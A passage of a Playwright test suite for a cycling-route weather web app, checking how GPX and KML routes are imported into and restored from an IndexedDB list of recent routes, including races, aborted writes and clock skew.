    Promise.all(all.map((text, i) => window.cw.importRoute({ text, name: `r${i + 1}.gpx` }))), texts);
  expect(results.every((r) => r.ok)).toBe(true);
  expect(await storedNames(page)).toEqual(['r2.gpx', 'r3.gpx', 'r4.gpx']);
});

// Success is the transaction completing. The write is let through and the transaction
// aborted straight after, which is the case a success on the write alone would report
// as saved.
test('an import whose transaction aborts says it was not saved and leaves nothing behind', async ({ page }) => {
  await recordNotices(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const result = await page.evaluate((text) => {
    const real = { add: IDBObjectStore.prototype.add, put: IDBObjectStore.prototype.put };
    for (const method of ['add', 'put']) {
      IDBObjectStore.prototype[method] = function (...args) {
        const request = real[method].apply(this, args);
        if (this.name === 'routes') {
          Object.assign(IDBObjectStore.prototype, real);
          request.addEventListener('success', () => request.transaction.abort());
        }
        return request;
      };
    }
    return window.cw.importRoute({ text, name: 'Ruta.gpx' });
  }, routeAt('Uno', 41.48));
  expect(result.ok).toBe(false);
  expect(await storedRoutes(page)).toEqual([]);
  await expect.poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(notSavedNotice)]));
});

test('a route too big for recent routes says it was not saved', async ({ page }) => {
  await recordNotices(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const big = routeAt('Grande', 41.48).replace('</gpx>', `<!-- ${'x'.repeat(760000)} --></gpx>`);
  expect((await importRecent(page, big, 'Grande.gpx')).ok).toBe(false);
  expect(await storedRoutes(page)).toEqual([]);
  await expect.poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(notSavedNotice)]));
});

test('a picked file that is not a route stays out of recent routes; a route goes in under its file name', async ({ page }) => {
  await recordNotices(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect.poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(loadFailedNotice)]));
  await page.waitForTimeout(300);
  expect(await storedRoutes(page)).toEqual([]);

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => storedNames(page)).toEqual(['route.gpx']);
});

test('text from outside that holds no route stays out of recent routes; a route still goes in', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate((text) => {
    window.cwInjectGPXFromText('this is not a route', 'x.gpx');
    window.cwInjectGPXFromText(text, 'ok.gpx');
  }, routeAt('Buena', 41.48));
  // Imports run in arrival order, so once this one is stored the two before it are decided.
  expect((await importRecent(page, routeAt('Otra', 40.42), 'after.gpx')).ok).toBe(true);
  expect(await storedNames(page)).toEqual(['after.gpx', 'ok.gpx']);
});

// A KML with no Placemark converts into an empty GPX. It used to be imported just for saying
// <kml, became the newest recent route and the one the next cold start failed to restore.
test('a shared KML with nothing to follow stays out of recent routes; a KML route still goes in', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const importsDone = () => page.evaluate(() => window.cw.enqueueRecents(() => true));

  await page.evaluate(() =>
    window.cwInjectGPXFromText('<kml xmlns="http://www.opengis.net/kml/2.2"><Document/></kml>', 'Empty.kml'));
  await importsDone();
  expect(await storedRoutes(page)).toEqual([]);

  await page.evaluate((text) => window.cwInjectGPXFromText(text, 'Costa.kml'), `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`);
  await importsDone();
  expect(await storedNames(page)).toEqual(['Costa.kml']);
});

// A record from an older version has no fingerprint, so nothing says what it holds. Matching
// it by name and size replaced it with a route that differed by one digit.
test('a stored route from an older version is never replaced by another of the same name and size', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const old = routeAt('Uno', 41.48);
  const other = routeAt('Uno', 41.49);
  expect(other.length).toBe(old.length);
  expect(await importRecent(page, old, 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta.gpx' });
  // What an older version stored: the same record, without a fingerprint.
  await page.evaluate(() => new Promise((resolve, reject) => {
    const open = indexedDB.open('meteoride_recent_routes_db');
    open.onerror = () => reject(open.error);
    open.onsuccess = () => {
      const tx = open.result.transaction('routes', 'readwrite');
      const store = tx.objectStore('routes');
      const all = store.getAll();
      all.onsuccess = () => all.result.forEach((r) => { delete r.fingerprint; store.put(r); });
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    };
  }));
  const [legacy] = await storedRoutes(page);
  expect(legacy.fingerprint).toBeUndefined();

  expect(await importRecent(page, other, 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta (2).gpx' });
  expect(await storedNames(page)).toEqual(['Ruta (2).gpx', 'Ruta.gpx']);
  const kept = await page.evaluate(() => new Promise((resolve) => {
    indexedDB.open('meteoride_recent_routes_db').onsuccess = (e) => {
      const all = e.target.result.transaction('routes').objectStore('routes').getAll();
      all.onsuccess = async () => resolve(await all.result.find((r) => r.name === 'Ruta.gpx').blob.text());
    };
  }));
  expect(kept).toBe(old);
});

test('an import comes out newest even when the stored routes carry times later than the clock', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const ahead = Date.now() + 365 * 86400000;
  for (const i of [1, 2, 3]) {
    const result = await page.evaluate(([text, name, at]) => window.cw.importRoute({ text, name, arrivedAt: at }),
      [routeAt(`Ruta ${i}`, 41 + i / 10), `r${i}.gpx`, ahead + i]);
    expect(result.ok).toBe(true);
  }
  // A later session, whose clock is behind what the store holds (the phone's clock was changed).
  await page.reload();
  await mapReady(page);
  expect(await importRecent(page, routeAt('Ruta 4', 41.45), 'r4.gpx')).toEqual({ ok: true, name: 'r4.gpx' });
  expect(await storedNames(page)).toEqual(['r2.gpx', 'r3.gpx', 'r4.gpx']);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().map((r) => r.name)))
    .toEqual(['r4.gpx', 'r3.gpx', 'r2.gpx']);
});

// Loading the list at start-up is a job in the import queue: an import that finished while
// it was still reading used to be overwritten by the older list it read.
test('an import made while recent routes are still loading at start-up is in the list afterwards', async ({ page }) => {
  await goOffline(page);
  await page.addInitScript(() => {
    let open;
    window.__recentsLoad = new Promise((r) => { open = r; });
    window.__openRecentsLoad = open;
    window.__recentsLoading = false;
    // The first read of the list sees the store as it is, but hears the answer only when
    // the test says so.
    const real = IDBIndex.prototype.openCursor;
    IDBIndex.prototype.openCursor = function (...args) {
      const req = real.apply(this, args);
      if (this.objectStore.name !== 'routes') return req;
      IDBIndex.prototype.openCursor = real;
      window.__recentsLoading = true;
      let handler = null;
      Object.defineProperty(req, 'onsuccess', { configurable: true, get: () => handler, set: (fn) => { handler = fn; } });
      req.addEventListener('success', (ev) => { window.__recentsLoad.then(() => handler && handler.call(req, ev)); });
      return req;
    };
  });
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.__recentsLoading)).toBe(true);

  await page.evaluate((text) => { window.__imported = window.cw.importRoute({ text, name: 'r1.gpx' }); }, routeAt('Uno', 41.48));
  await page.waitForTimeout(300);
  await page.evaluate(() => window.__openRecentsLoad());
  expect((await page.evaluate(() => window.__imported)).ok).toBe(true);
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.getRecentRoutes().map((r) => r.name))).toEqual(['r1.gpx']);
});

test('moving an opened recent route to the top never writes back a route an import trimmed', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  for (const i of [1, 2, 3]) {
    expect((await importRecent(page, routeAt(`Ruta ${i}`, 41 + i / 10), `r${i}.gpx`)).ok).toBe(true);
  }
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().length)).toBe(3);

  // r1, the oldest, is opened. As soon as it is confirmed and the move to the top opens its
  // transaction, r4 arrives, and importing it trims the store to three.
  const opened = await page.evaluate(async (text) => {
    const request = window.cw.requestRoute;
    window.cw.requestRoute = async (...args) => {
      const status = await request(...args);
      const open = IDBDatabase.prototype.transaction;
      IDBDatabase.prototype.transaction = function (...targs) {
        const tx = open.apply(this, targs);
        if ([].concat(targs[0]).includes('routes')) {
          IDBDatabase.prototype.transaction = open;
          window.__import = window.cw.importRoute({ text, name: 'r4.gpx' });
        }
        return tx;
      };
      return status;
    };
    const status = await window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === 'r1.gpx'));
    window.cw.requestRoute = request;
    await window.__import;
    return status;
  }, routeAt('Ruta 4', 41.45));
  expect(opened).toBe('committed');
  // The move went first and made r1 the newest, so the import trimmed r2.
  expect(await storedNames(page)).toEqual(['r1.gpx', 'r3.gpx', 'r4.gpx']);

  // r3 is now the oldest. The import that trims it is queued before the move of r3, which
  // then finds nothing to move and writes nothing back.
  const r3 = (await storedRoutes(page)).find((r) => r.name === 'r3.gpx').id;
  const [imported, moved] = await page.evaluate(([text, id]) => Promise.all([
    window.cw.importRoute({ text, name: 'r5.gpx' }),
    window.cw.touchRecent(id),
  ]), [routeAt('Ruta 5', 41.5), r3]);
  expect(imported.ok).toBe(true);
  expect(moved).toBe(false);
  expect(await storedNames(page)).toEqual(['r1.gpx', 'r4.gpx', 'r5.gpx']);
});

test('an opened recent route moves up the list only once it moved in the store', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  for (const i of [1, 2, 3]) {
    expect((await importRecent(page, routeAt(`Ruta ${i}`, 41 + i / 10), `r${i}.gpx`)).ok).toBe(true);
  }
  const listed = () => page.evaluate(() => window.getRecentRoutes().map((r) => r.name));
  await expect.poll(listed).toEqual(['r3.gpx', 'r2.gpx', 'r1.gpx']);

  // A move that does not happen leaves the list as the store has it.
  const status = await page.evaluate(async () => {
    const real = window.cwIdbTouchRoute;
    window.cwIdbTouchRoute = async () => false;
    const s = await window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === 'r1.gpx'));
    window.cwIdbTouchRoute = real;
    return s;
  });
  expect(status).toBe('committed');
  expect(await listed()).toEqual(['r3.gpx', 'r2.gpx', 'r1.gpx']);

  // One that happens puts it first, with the time the store gave it.
  await page.evaluate(() => window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === 'r1.gpx')));
  expect(await listed()).toEqual(['r1.gpx', 'r3.gpx', 'r2.gpx']);
  const [first] = await page.evaluate(() => window.getRecentRoutes());
  const stored = await page.evaluate((id) => new Promise((resolve) => {
    const open = indexedDB.open('meteoride_recent_routes_db');
    open.onsuccess = () => {
      const get = open.result.transaction('routes').objectStore('routes').get(id);
      get.onsuccess = () => resolve(get.result.timestamp);
    };
  }), first.id);
  expect(first.timestamp).toBe(stored);
});

test('opening the newest recent route survives a later import after the clock runs back', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Seed 3 routes directly in IndexedDB with timestamps far in the future, as if the
  // phone's clock was running ahead when they were imported. r3 is the newest.
  const future = 5_000_000_000_000;
  const routes = [1, 2, 3].map((i) => [`r${i}.gpx`, routeAt(`Ruta ${i}`, 41 + i / 10)]);
  await page.evaluate(([base, entries]) => new Promise((resolve, reject) => {
    const open = indexedDB.open('meteoride_recent_routes_db');
    open.onerror = () => reject(open.error);
    open.onsuccess = () => {
      const tx = open.result.transaction('routes', 'readwrite');
      const store = tx.objectStore('routes');
      entries.forEach(([name, text], i) => {
        const blob = new Blob([text], { type: 'application/gpx+xml' });
        store.add({ name, size: blob.size, lastModified: base + i, timestamp: base + i, fingerprint: name, blob });
      });
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    };
  }), [future, routes]);

  // A cold start picks up the seeded routes, newest first.
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().map((r) => r.name)))
    .toEqual(['r3.gpx', 'r2.gpx', 'r1.gpx']);

  // The clock is back to normal, far below the seeded timestamps, and the newest route
  // (r3) is opened from the recents menu.
  const opened = await page.evaluate(async () => {
    return window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === 'r3.gpx'));
  });
  expect(opened).toBe('committed');

  // One more route arrives. r3, the one just opened and on screen, must not be trimmed.
  expect((await importRecent(page, routeAt('Ruta 4', 41.4), 'r4.gpx')).ok).toBe(true);
  expect(await storedNames(page)).toEqual(['r2.gpx', 'r3.gpx', 'r4.gpx']);
});

test('a route requested while a tapped recent route is still being read wins, and the menu closes at once', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect((await importRecent(page, routeAt('Reciente', 41.48), 'reciente.gpx')).ok).toBe(true);
  await expect(page.locator('.recent-routes-menu-item')).toHaveCount(0);
  await page.locator('#recentRoutesButton').click();
  await expect(page.locator('.recent-routes-menu-item')).toHaveCount(1);

  // Every IndexedDB open from here on is answered only when the test says so.
  await page.evaluate(() => {
    let open;
    window.__idbHeld = new Promise((r) => { open = r; });
    window.__releaseIdb = open;
    window.__idbOpens = 0;
    const real = IDBFactory.prototype.open;
    IDBFactory.prototype.open = function (...args) {
      window.__idbOpens++;
      const req = real.apply(this, args);
      let handler = null;
      Object.defineProperty(req, 'onsuccess', { configurable: true, get: () => handler, set: (fn) => { handler = fn; } });
      req.addEventListener('success', (ev) => { window.__idbHeld.then(() => handler && handler.call(req, ev)); });
      return req;
    };
  });
  await page.locator('.recent-routes-menu-item').first().click();
  await expect.poll(() => page.evaluate(() => window.__idbOpens), 'the tapped route is being read').toBeGreaterThan(0);
  const menuOpenWhileRead = await page.locator('#recentRoutesMenu').isVisible();

  await requestHeld(page, 'B');
  await openRead(page, 'B', routeAt('Ruta B', 40.42), 'b.gpx');
  await expect(routeName(page)).toHaveText('Ruta B');
  await page.evaluate(() => window.__releaseIdb());
  await page.waitForTimeout(800);
  await expect(routeName(page)).toHaveText('Ruta B');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('b.gpx');
  expect(menuOpenWhileRead, 'the menu stayed open while the route was read').toBe(false);
});

/* ---------- settings that only change how it looks ---------- */

const flipControl = (page, id) =>
  page.evaluate((elId) => {
    const el = document.getElementById(elId);
    if (el.type === 'checkbox') el.checked = !el.checked;
    else el.value = [...el.options].map((o) => o.value).find((v) => v !== el.value);
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }, id);

test('settings that only change how it looks never compute the forecast again', async ({ page }) => {
  let requests = 0;
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => {
    requests += 1;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(21)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(500);

  const before = await shownTemperatures(page);
  const asked = requests;
  await countLaunches(page);
  await page.evaluate(() => {
    window.__forecasts = 0;
    document.addEventListener('cw:forecast', () => { window.__forecasts++; });
    window.__repaints = 0;
    const paint = window.processWeatherData;
    window.processWeatherData = function (...args) { window.__repaints++; return paint.apply(this, args); };
  });

  // Language and detailed notices repaint; the debug button and ride alerts do not even that.
  await flipControl(page, 'language');
  await flipControl(page, 'noticeAll');
  await flipControl(page, 'showDebugButton');
  await flipControl(page, 'rideAlerts');
  await page.waitForTimeout(800);

  expect(requests).toBe(asked);
  expect(await page.evaluate(() => ({ launches: window.__launches.launch, forecasts: window.__forecasts, repaints: window.__repaints })))
    .toEqual({ launches: 0, forecasts: 0, repaints: 2 });
  expect(await shownTemperatures(page)).toEqual(before);
});

test('detailed notices switch the notice of the forecast on screen on and off', async ({ page }) => {
  let calls = 0;
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => {
    calls += 1;
    return calls === 1
      ? route.fulfill({ status: 500, contentType: 'application/json', body: '{}' })
      : route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(21)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  expect(await page.evaluate(() => document.getElementById('noticeAll').checked)).toBe(true);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  const notice = page.locator('#horizonNotice');
  await expect(notice).toContainText('500');
  const asked = calls;

  await flipControl(page, 'noticeAll');
  await expect(notice).toBeHidden();
  await flipControl(page, 'noticeAll');
  await expect(notice).toContainText('500');
  expect(calls).toBe(asked);
});

test('detailed notices switched after a route failed to open leave that notice up, also while the next forecast is computed', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const notice = page.locator('#horizonNotice');

  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect(notice).toHaveText(loadFailedNotice);
  await flipControl(page, 'noticeAll');
  await page.waitForTimeout(300);
  await expect(notice).toHaveText(loadFailedNotice);

  // Failing while the next forecast still fetches: the repaint is of the forecast that one replaces.
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await setSpeed(page, 60);
  await expect.poll(() => overlayVisibility(page)).toBe('visible');
  await pickText(page, 'broken-again.gpx', 'still not a route');
  await expect(notice).toHaveText(loadFailedNotice);
  await flipControl(page, 'noticeAll');
  await page.waitForTimeout(300);
  await expect(notice).toHaveText(loadFailedNotice);

  control.forecastHeld = null;
  held.release();
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  await page.waitForTimeout(300);
  await expect(notice).toHaveText(loadFailedNotice);
});

/* ---------- restoring the last route at start-up ---------- */

/** Opens the app once with the fixture picked, so it is among the recent routes. */
async function seedRecentRoute(page) {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await storedRoutes(page)).length).toBe(1);
}

/** From the next page load, reading a recent route counts in __recentReads and waits for
 *  window.__openRecentRead(). */
const holdRecentRead = (page) =>
  page.addInitScript(() => {
    let open;
    window.__recentRead = new Promise((r) => { open = r; });
    window.__openRecentRead = open;
    window.__recentReads = 0;
    let real;
    Object.defineProperty(window, 'cwReadRecentRoute', {
      configurable: true,
      set(v) { real = v; },
      get() { return async (route) => { window.__recentReads++; await window.__recentRead; return real(route); }; },
    });
  });

// Spec §6: the recent route is read after the shared one has already published, and the
// shared one still wins.
test('a route shared while the last recent route is still being read at start-up wins', async ({ page }) => {
  await seedRecentRoute(page);
  await holdRecentRead(page);
  await page.reload();
  await mapReady(page);
  // The restore is already reading the recent route, or this would prove nothing.
  await expect.poll(() => page.evaluate(() => window.__recentReads)).toBe(1);

  const shared = page.evaluate((text) => window.cwLoadGPXFromString(text, 'shared.gpx'), routeAt('Compartida', 40.42));
  await expect(routeName(page)).toHaveText('Compartida');
  expect(await shared).toBe('committed');
  await page.evaluate(() => window.__openRecentRead());
  await page.waitForTimeout(800);
  await expect(routeName(page)).toHaveText('Compartida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('shared.gpx');
  expect(await page.evaluate(() => window.__recentReads)).toBe(1);
});

// The restore used to ask for its route only once the recent routes had loaded, so a route
// still on its way in at that moment (a download, a slow read) lost to the older one.
test('a route still arriving when the recent routes turn up is not replaced by the last recent one', async ({ page }) => {
  await seedRecentRoute(page);
  await page.addInitScript(() => {
    window.__recentsOpen = false;
    let real;
    Object.defineProperty(window, 'getRecentRoutes', {
      configurable: true,
      set(v) { real = v; },
      get() { return () => (window.__recentsOpen && real ? real() : []); },
    });
  });
  await page.reload();
  await mapReady(page);

  await requestHeld(page, 'shared', 'message');
  await page.evaluate(() => { window.__recentsOpen = true; });
  // The restore polls for recent routes every 200 ms; give it time to find and read one.
  await page.waitForTimeout(800);
  await openRead(page, 'shared', routeAt('Compartida', 40.42), 'shared.gpx');

  await expect(routeName(page)).toHaveText('Compartida');
  await page.waitForTimeout(500);
  await expect(routeName(page)).toHaveText('Compartida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('shared.gpx');
});

// Boot asks for the last route before anything else in the app does, but a request can exist
// before boot: the sessionStorage handoff asks while app.js loads. Nothing is on screen until a
// request confirms, so the restore asks the coordinator whether anyone has asked for a route
// yet, rather than looking at lastGPXFile.
test('a route asked for before the app boots is not replaced by the restore of the last route', async ({ page }) => {
  await seedRecentRoute(page);
  await holdRecentRead(page);
  // Registered before native.js loads, so this listener runs before boot.
  await page.addInitScript(() => {
    document.addEventListener('DOMContentLoaded', () => {
      let open;
      const held = new Promise((resolve) => { open = resolve; });
      window.__reads = { pick: open };
      window.__status = {};
      window.cw.requestRoute({ source: 'file', read: () => held }).then((s) => { window.__status.pick = s; });
    });
  });
  await page.reload();
  await mapReady(page);

  // Time for a restore to find the recent route and start reading it.
  await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__recentReads), 'the restore read a recent route').toBe(0);
  await page.evaluate(() => window.__openRecentRead());
  await openRead(page, 'pick', routeAt('Elegida', 40.42), 'picked.gpx');
  await expect.poll(() => requestStatus(page, 'pick')).toBe('committed');
  await page.waitForTimeout(300);
  await expect(routeName(page)).toHaveText('Elegida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('picked.gpx');
});

/* ---------- routes from outside ---------- */

/** Holds app.js's start-up, the map first, until the test calls window.__openMap(). */
async function holdMap(page) {
  await page.addInitScript(() => {
    let open;
    const gate = new Promise((r) => { open = r; });
    window.__openMap = open;
    const add = document.addEventListener;
    document.addEventListener = function (type, fn, ...rest) {
      const fromApp = /\/scripts\/app\.js$/.test((document.currentScript && document.currentScript.src) || '');
      return add.call(this, type, type === 'DOMContentLoaded' && fromApp ? () => gate.then(fn) : fn, ...rest);
    };
  });
}

const importsDone = (page) => page.evaluate(() => window.cw.enqueueRecents(() => true));

// A route from outside used to wait for the map before asking for itself, so a file picked
// during that wait was the earlier request and lost to it.
test('a route from outside asks for itself before the map exists, and a file picked after it wins', async ({ page }) => {
  await holdMap(page);
  await goOffline(page);
  await page.goto('/index.html');
  await page.evaluate((text) => { window.__shared = window.cwInjectGPXFromText(text, 'shared.gpx'); }, routeAt('Compartida', 41.48));
  expect(await page.evaluate(() => ({ map: !!window.map, asked: window.cw.hasRouteRequests() })))
    .toEqual({ map: false, asked: true });

  await requestHeld(page, 'pick');
  await page.evaluate(() => window.__openMap());
  await mapReady(page);
  await openRead(page, 'pick', routeAt('Elegida', 40.42), 'picked.gpx');
  await expect.poll(() => requestStatus(page, 'pick')).toBe('committed');
  expect(await page.evaluate(() => window.__shared)).toBe('superseded');
  await page.waitForTimeout(300);
  await expect(routeName(page)).toHaveText('Elegida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('picked.gpx');
});

test('a route from outside imported as it arrives is kept among recent routes even when a later request replaces it', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate((text) => {
    window.__shared = window.cwInjectGPXFromText(text, 'shared.gpx');
    window.cw.requestRoute({ source: 'file', read: async () => null });
  }, routeAt('Compartida', 41.48));
  expect(await page.evaluate(() => window.__shared)).toBe('superseded');
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['shared.gpx']);
});

test('a route from outside imported on confirming is kept only once it is the route confirmed', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate((text) => {
    window.__replaced = window.cwLoadGPXFromString(text, 'replaced.gpx');
    window.cw.requestRoute({ source: 'file', read: async () => null });
  }, routeAt('Sustituida', 41.48));
  expect(await page.evaluate(() => window.__replaced)).toBe('superseded');
  expect(await page.evaluate((text) => window.cwLoadGPXFromString(text, 'kept.gpx'), routeAt('Buena', 40.42))).toBe('committed');
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['kept.gpx']);
});

// Something other than text used to ask for a route all the same, replacing the route being read,
// and only then fail.
test('a route handed over as something other than text replaces nothing and ends as failed', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await requestHeld(page, 'pick');

  expect(await page.evaluate(() => Promise.all([
    window.cwLoadGPXFromString({ a: 1 }, 'object.gpx'),
    window.cwInjectGPXFromText(1, 'number.gpx'),
    window.cwLoadGPXFromString('', 'empty.gpx'),
  ]))).toEqual(['failed', 'failed', 'failed']);
  await postRoute(page, { a: 1 }, 'posted.gpx');
  await expect.poll(() => acks(page)).toEqual([expect.objectContaining({ ok: false, status: 'failed', name: 'posted.gpx' })]);

  await openRead(page, 'pick', routeAt('Elegida', 40.42), 'picked.gpx');
  await expect.poll(() => requestStatus(page, 'pick')).toBe('committed');
  await expect(routeName(page)).toHaveText('Elegida');
});

test('a route from outside whose import throws is still shown, and nothing is left unhandled', async ({ page }) => {
  const { crashes } = watchForBreakage(page);
  await page.addInitScript(() => {
    Object.defineProperty(window, 'cwImportIfRoute', {
      configurable: true,
      set() {},
      get() { return () => { throw new Error('import broke'); }; },
    });
  });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  expect(await page.evaluate((t) => window.cwInjectGPXFromText(t, 'shared.gpx'), routeAt('Compartida', 41.48))).toBe('committed');
  expect(await page.evaluate((t) => window.cwLoadGPXFromString(t, 'posted.gpx'), routeAt('Mensaje', 40.42))).toBe('committed');
  await page.waitForTimeout(300);
  await expect(routeName(page)).toHaveText('Mensaje');
  expect(crashes).toEqual([]);
});

// The wait for the map polled every 100 ms for the life of the page once a request that needed
// it had ended without one. The poll reads window.map, so counting those reads counts polls.
test('a route from outside that runs out of time without a map stops waiting for it, and is still kept', async ({ page }) => {
  await page.clock.install();
  await holdMap(page);
  await page.addInitScript(() => {
    window.__mapLooks = 0;
    let value;
    Object.defineProperty(window, 'map', {
      configurable: true,
      get() { window.__mapLooks++; return value; },
      set(v) { value = v; },
    });
  });
  await goOffline(page);
  await page.goto('/index.html');
  await page.evaluate((text) => {
    window.__shared = null;
    window.cwInjectGPXFromText(text, 'shared.gpx').then((s) => { window.__shared = s; });
  }, routeAt('Compartida', 41.48));
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__shared), 'ended before its deadline').toBe(null);

  await page.clock.fastForward(31000);
  await expect.poll(() => page.evaluate(() => window.__shared)).toBe('failed');
  const looks = await page.evaluate(() => window.__mapLooks);
  await page.clock.runFor(2000);
  expect(await page.evaluate(() => window.__mapLooks), 'still polling for the map').toBe(looks);

  await importsDone(page);
  expect(await storedNames(page)).toEqual(['shared.gpx']);
});

// Whether a route is a KML used to be decided twice: anywhere in the text for keeping it, by its
// name or first 4096 characters for opening it. A KML with a long comment first and no .kml name
// was kept, failed to open, and became the recent route the next start-up failed to restore.
test('a shared KML is kept among recent routes only when it would also open as one', async ({ page }) => {
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
<!-- ${'x'.repeat(5000)} -->
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`;
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  expect(await page.evaluate((t) => window.cwInjectGPXFromText(t, 'Costa'), kml)).toBe('failed');
  await importsDone(page);
  expect(await storedRoutes(page)).toEqual([]);

  expect(await page.evaluate((t) => window.cwInjectGPXFromText(t, 'Costa.kml'), kml)).toBe('committed');
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['Costa.kml']);

  // A real GPX under a .kml name converts into nothing, and opening it falls back to the text as
  // it arrived. Keeping it has to fall back the same way.
  expect(await page.evaluate((t) => window.cwInjectGPXFromText(t, 'route.kml'), routeAt('Real', 41.48))).toBe('committed');
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['Costa.kml', 'route.kml']);
});

/** From now on, the i-th write into recent routes waits for window.__openImport[i](). */
const holdImports = (page, count) =>
  page.evaluate((n) => {
    const gates = Array.from({ length: n }, () => { let open; const held = new Promise((r) => { open = r; }); return { held, open }; });
    window.__openImport = gates.map((g) => g.open);
    const real = window.cwIdbImportRoute;
    let calls = 0;
    window.cwIdbImportRoute = async (input) => { const gate = gates[calls++]; if (gate) await gate.held; return real(input); };
  }, count);

// Spec §6. The start-up used to drain the inbox first and restore only when nothing came in.
// Now the restore asks at once, so a drain that outlasts it hands over a later request.
test('a route the inbox hands over after the restore has started wins, even when the recent route is read after it', async ({ page }) => {
  await seedRecentRoute(page);
  await installNativeBridge(page, { delayMs: 1000, routes: [{ name: 'shared.gpx', gpx: routeAt('Compartida', 40.42) }] });
  await holdRecentRead(page);
  await page.reload();
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.__recentReads), 'the restore is reading while the inbox drains').toBe(1);
  expect(await page.evaluate(() => window.__delivered), 'the inbox handed over its route before the restore read').toEqual([]);

  await expect(routeName(page)).toHaveText('Compartida');
  await page.evaluate(() => window.__openRecentRead());
  await page.waitForTimeout(800);
  await expect(routeName(page)).toHaveText('Compartida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('shared.gpx');
});

// Spec §6: showing and keeping are separate. The recent route tapped later is shown; the shared
// route read before it is kept, although its import only lands after the tap.
test('a shared route read before a recent route is tapped, and imported after it, leaves the recent route on screen and is kept', async ({ page }) => {
  await seedRecentRoute(page);
  await holdImports(page, 1);
  await page.evaluate(async (text) => {
    // Masnou is already on screen from seeding, so what each request ended as is what shows the
    // tap won.
